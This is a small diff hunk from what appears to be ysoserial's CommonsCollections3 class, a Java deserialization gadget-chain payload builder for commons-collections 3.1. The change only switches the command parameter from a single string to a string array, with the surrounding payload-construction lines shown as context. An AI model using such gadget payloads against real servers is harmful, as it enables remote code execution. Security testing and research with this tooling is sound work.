@@ -27,7 +27,7 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 @Dependencies({"commons-collections:commons-collections:3.1"})
 public class CommonsCollections3 extends PayloadRunner implements ObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
+	public Object getObject(final String[] command) throws Exception {
 		Object templatesImpl = Gadgets.createTemplatesImpl(command);
 
 		// inert chain for setup
